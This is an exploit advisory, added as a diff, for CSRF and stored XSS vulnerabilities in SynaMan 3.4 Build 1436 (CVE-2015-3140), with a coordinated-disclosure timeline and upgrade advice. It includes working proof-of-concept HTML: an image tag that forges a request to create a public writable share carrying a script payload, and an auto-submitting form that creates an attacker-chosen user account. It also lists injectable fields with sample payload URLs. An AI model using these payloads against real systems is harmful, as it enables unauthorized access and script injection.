@@ -1,0 +1,75 @@
+# Exploit Title: Multiple vulnerabilities in SynaMan 3.4 Build 1436 (CSRF/Stored XSS)
+# Date: 07-05-2015
+# Exploit Author: Marlow Tannhauser
+# Contact: marlowtannhauser@gmail.com
+# Vendor Homepage: http://www.synametrics.com
+# Software Link: http://web.synametrics.com/SynaManDownload.htm
+# Version: 3.4 Build 1436. Earlier versions may also be affected.
+# CVE: 2015-3140
+# Category: Web apps
+
+
+# DISCLOSURE TIMELINE #
+08/02/2015: Initial disclosure to vendor and CERT
+09/02/2015: Acknowledgment of vulnerabilities from vendor
+11/02/2015: Disclosure deadline of 01/03/2015 agreed with vendor
+19/02/2015: Disclosure deadline renegotiated to 01/04/2015 at vendor's request
+09/04/2015: Disclosure deadline renegotiated to 20/04/2015 at vendor's request
+20/04/2015: Confirmation of fix from vendor
+07/05/2015: Disclosure
+
+Note that the CVE-ID is for the CSRF vulnerability only. No CVE-ID has been generated for the stored XSS vulnerabilities. The vulnerable version of the product is no longer available for download from the vendor's webpage.
+
+
+# EXPLOIT DESCRIPTION #
+SynaMan 3.4 Build 1436 is vulnerable to CSRF attacks, which can also be combined with stored XSS attacks (authenticated administrators only). The JSESSIONID created when a user logs on to the system is persistent and does not change across requests.
+
+
+# POC 1 #
+The following PoC uses the CSRF vulnerability together with one of the stored XSS vulnerabilities, to create a new shared folder in the application.
+
+<html>
+<img src="http://192.168.0.8:6060/app?sharedName=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&selectedPath=C%3A\&publicRead=1&publicWrite=1&operation=mngFolders&st=addFolder" alt="" width="1" height="1">
+</html>
+
+
+# POC 2 #
+The following PoC uses the CSRF vulnerability to create a new user with the details shown.
+
+<html>
+<body>
+<form name="evilform" method="post" action="http://192.168.1.67:6060/app?operation=mngUsers">
+<input type="hidden" name="fullName" value="marlow"/>
+<input type="hidden" name="login" value="marlow@marlow.com" />
+<input type="hidden" name="password" value="marlow" />
+<input type="hidden" name="operation" value="mngUsers" />
+<input type="hidden" name="st" value="saveUser" />
+<input type="hidden" name="oldLogin" value="" />
+<input type="hidden" name="modifyUser" value="false" />
+</form>
+<script type="text/javascript">
+document.evilform.submit();
+</script>
+</body>
+</html>
+
+
+# STORED XSS VULNERABILITIES # 
+Stored XSS vulnerabilities are present in the following fields:
+
+Managing Shared Folders > Shared folder name field
+Example URL: http://192.168.0.8:6060/app?sharedName=%3Cscript%3Ealert%28%22Hello1%22%29%3C%2Fscript%3E&selectedPath=C%3A\&publicRead=1&publicWrite=1&operation=mngFolders&st=addFolder
+
+Manage Users > Add a new user > User's name field and Email/Login field
+Example URL: POST request
+
+Advanced Configuration > Partial Branding > Main heading field and Sub heading field
+Affects all users on all pages, pre and post authentication
+Example URL: POST request
+
+Discovery Wizard > Discovery Service Signup > One-Word name
+Example URL: http://192.168.0.8:6060/app?oneword=%3Cscript%3Ealert%28%22Marlow%22%29%3C%2Fscript%3E&x=35&y=21&operation=discovery&st=checkAvailability
+
+
+# MITIGATION #
+Upgrade to the latest build of SynaMan, available from the link shown.
